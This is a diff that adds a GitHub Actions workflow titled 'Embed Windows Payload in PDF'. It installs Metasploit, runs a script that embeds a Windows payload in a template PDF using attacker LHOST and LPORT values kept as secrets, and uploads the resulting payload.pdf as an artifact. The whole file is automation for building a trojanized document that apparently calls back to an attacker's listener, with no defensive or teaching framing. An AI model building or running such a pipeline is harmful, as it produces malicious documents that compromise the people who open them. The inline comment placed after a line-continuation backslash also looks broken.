@@ -1,0 +1,37 @@
+name: Embed Windows Payload in PDF
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Optional - Clone PDF template from external repo
+        # Uncomment and edit if you want to use a template from another repo
+        # uses: actions/checkout@v4
+        # with:
+        #   repository: anotherowner/templaterepo
+        #   path: pdf_template_repo
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y metasploit-framework mupdf-tools
+
+      - name: Run payload embedding script
+        run: |
+          chmod +x generate_and_embed_windows_payload.sh
+          ./generate_and_embed_windows_payload.sh \
+            "${{ secrets.LHOST }}" \
+            "${{ secrets.LPORT }}" \
+            "template.pdf" \      # <-- Adjust to your template path
+            "payload.pdf"
+
+      - name: Upload PDF artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: windows-pdf-payload
+          path: payload.pdf
